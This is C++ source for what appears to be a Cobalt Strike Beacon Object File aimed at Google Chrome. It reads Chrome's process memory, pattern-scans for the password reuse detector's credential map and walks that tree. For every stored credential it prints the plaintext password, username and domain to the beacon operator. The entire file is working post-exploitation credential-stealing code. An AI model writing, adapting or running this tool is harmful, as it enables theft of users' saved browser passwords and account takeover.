#include <cstdint>

struct WideOptimizedString {
    wchar_t buf[11];
    char unk[1];
    UCHAR len;
};

struct OptimizedString {
    char buf[23];
    UCHAR len;
};

struct RemoteString {
    uintptr_t dataAddress;
    size_t strLen; //This won't include the null terminator
    int strMax; //Maximum string length
    char unk[3]; //I just couldn't figure out the last data type :(
    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

enum class Store {
    // Default value.
    kNotSet = 0,
    // Credential came from the profile (i.e. local) storage.
    kProfileStore = 1 << 0,
    // Credential came from the Gaia-account-scoped storage.
    kAccountStore = 1 << 1,
    kMaxValue = kAccountStore
};

struct MatchingReusedCredential {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];

    OptimizedString domain;
    BYTE GURL[120];
    WideOptimizedString username;
    Store credentialStore;
};

struct Node {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];
    WideOptimizedString key;
    uintptr_t valueAddress;
};

struct RootNode {
    uintptr_t beginNode;
    uintptr_t firstNode;
    size_t size;
};

//Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
//Or if it is stored in another address
void ReadWideString(HANDLE hProcess, WideOptimizedString string, formatp* buffer) {

    if (string.len > 11)
    {
        RemoteString longString = { 0 };
        memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            wchar_t* buf = (wchar_t*)malloc((longString.strMax + 1) * 2);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, (longString.strLen + 1) * 2, nullptr)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read credential value", GetLastError());
                free(buf);
                return;
            }
            BeaconFormatPrintf(buffer, "%ls\n", buf);
            free(buf);
        }
    }
    else
        BeaconFormatPrintf(buffer, "%ls\n", string.buf);

}

void ReadString(HANDLE hProcess, OptimizedString string, formatp* buffer) {

    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            unsigned char* buf = (unsigned char*)malloc(longString.strMax);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie value", GetLastError());
                free(buf);
                return;
            }
            BeaconFormatPrintf(buffer, "%s\n", buf);
            free(buf);
        }
    }
    else
        BeaconFormatPrintf(buffer, "%s\n", string.buf);

}

void PrintValues(MatchingReusedCredential creds, HANDLE hProcess, formatp* buffer) {
    BeaconFormatPrintf(buffer, "    Name: ");
    ReadWideString(hProcess, creds.username, buffer);
    BeaconFormatPrintf(buffer, "    Domain: ");
    ReadString(hProcess, creds.domain, buffer);
    if (creds.credentialStore == Store::kNotSet)
        BeaconFormatPrintf(buffer, "    CredentialStore: NotSet");
    else if (creds.credentialStore == Store::kAccountStore)
        BeaconFormatPrintf(buffer, "    CredentialStore: AccountStore");
    else if (creds.credentialStore == Store::kProfileStore)
        BeaconFormatPrintf(buffer, "    CredentialStore: ProfileStore");
    else if (creds.credentialStore == Store::kMaxValue)
        BeaconFormatPrintf(buffer, "    CredentialStore: MaxValue");
    else
        BeaconFormatPrintf(buffer, "    CredentialStore: Error!");

    BeaconFormatPrintf(buffer, "\n\n");
}

void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, formatp* buffer) {

    MatchingReusedCredential creds = { 0 };
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &creds, sizeof(MatchingReusedCredential), nullptr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to read credential struct", GetLastError());
        return;
    }
    PrintValues(creds, hProcess, buffer);
}

void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer, int* bufsize) {
    // Process the current node
    BeaconFormatReset(buffer);
    BeaconFormatPrintf(buffer, "Credential entry:\n");
    BeaconFormatPrintf(buffer, "    Password: ");
    ReadWideString(hProcess, node.key, buffer);

#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read credential values from address:  0x%p\n", (void*)node.valueAddress);
#endif
    ProcessNodeValue(hProcess, node.valueAddress, buffer);
    BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);

    // Process the left child if it exists
    if (node.left != 0) {
        Node leftNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, leftNode, buffer ,bufsize);
        else
            BeaconPrintf(CALLBACK_ERROR, "Error reading left node", GetLastError());
    }

    // Process the right child if it exists
    if (node.right != 0) {
        Node rightNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, rightNode, buffer, bufsize);
        else
            BeaconPrintf(CALLBACK_ERROR, "Error reading right node", GetLastError());
    }
}

void WalkCredentialMap(HANDLE hProcess, uintptr_t credentialMapAddress) {

    RootNode credentialMap;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMapAddress), &credentialMap, sizeof(RootNode), nullptr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to read the root node from given address\n", GetLastError());
        return;
    }

    // Process the root node
#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "Address of beginNode: 0x%p\n", (void*)credentialMap.beginNode);
    BeaconPrintf(CALLBACK_OUTPUT, "Address of firstNode: 0x%p\n", (void*)credentialMap.firstNode);
    BeaconPrintf(CALLBACK_OUTPUT, "Size of the credential map: %Iu\n", credentialMap.size);
#endif // _DEBUG

    BeaconPrintf(CALLBACK_OUTPUT, "Number of available credentials: %Iu\n\n", credentialMap.size);

    if (credentialMap.firstNode == 0) //CookieMap was empty
    {
        BeaconPrintf(CALLBACK_OUTPUT, "This credential map was empty\n");
        return;
    }

    // Process the first node in the binary search tree
    Node firstNode;
    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
        formatp buffer;
        int bufsize = 5 * 1024;
        BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"

        ProcessNode(hProcess, firstNode, &buffer, &bufsize);

        BeaconFormatFree(&buffer);
    }
    else
        BeaconPrintf(CALLBACK_ERROR, "Error reading first node\n", GetLastError());
}

BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

    for (size_t i = 0; i < num; ++i) {
        if (searchPattern[i] == 0xAA)
            continue;
        if (source[i] != searchPattern[i])
            return FALSE;
    }

    return TRUE;
}

void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
    size_t szAddr = sizeof(uintptr_t) - 1;
    for (offset -= 1; szAddr > 3; offset--) {
        pattern[offset] = baseAddrPattern[szAddr];
        szAddr--;
    }
}

BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {

    //Copy the pattern
    BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
    for (size_t i = 0; i < patternSize; i++)
        newPattern[i] = pattern[i];

    BYTE baseAddrPattern[sizeof(uintptr_t)];
    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));

    PatchPattern(newPattern, baseAddrPattern, 40);
    PatchPattern(newPattern, baseAddrPattern, 48);

    return newPattern;
}

BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* PasswordReuseDetectorInstances, size_t& szPasswordReuseDetectorInstances) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo;

    while (startAddress < endAddress) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
                BYTE* buffer = (BYTE*)malloc(sizeof(BYTE) * memoryInfo.RegionSize);
                SIZE_T bytesRead;

                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));

                //Error code 299
                //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
                //We are fine with that -- We were not fine with that
                //if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead) || GetLastError() == 299) {
                if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                            uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                            uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                            PRINT("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                memoryInfo.AllocationBase,
                                memoryInfo.BaseAddress,
                                offset);
#endif
                            if (szPasswordReuseDetectorInstances >= 100) {
                                free(newPattern);
                                return TRUE;
                            }

                            PasswordReuseDetectorInstances[szPasswordReuseDetectorInstances] = resultAddress;
                            szPasswordReuseDetectorInstances++;
                        }
                    }
                }
                else {
                    //This happens quite a lot, will not print these errors on release build
                    //DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                }
                free(newPattern);
                free(buffer);
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            DEBUG_PRINT_ERROR_MESSAGE(TEXT("VirtualQueryEx failed\n"));
            break;  // VirtualQueryEx failed
        }
    }
    if (szPasswordReuseDetectorInstances > 0)
        return TRUE;
    return FALSE;
}

BOOL FindLargestSection(HANDLE hProcess, uintptr_t moduleAddr, uintptr_t& resultAddress) {

    MEMORY_BASIC_INFORMATION memoryInfo;
    uintptr_t offset = moduleAddr;

    SIZE_T largestRegion = 0;

    while (VirtualQueryEx(hProcess, reinterpret_cast<LPVOID>(offset), &memoryInfo, sizeof(memoryInfo)))
    {
        if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE)
        {
            if (memoryInfo.RegionSize > largestRegion) {
                largestRegion = memoryInfo.RegionSize;
                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
            }
        }
        offset += memoryInfo.RegionSize;
    }
    if (largestRegion > 0)
        return TRUE;

    return FALSE;
}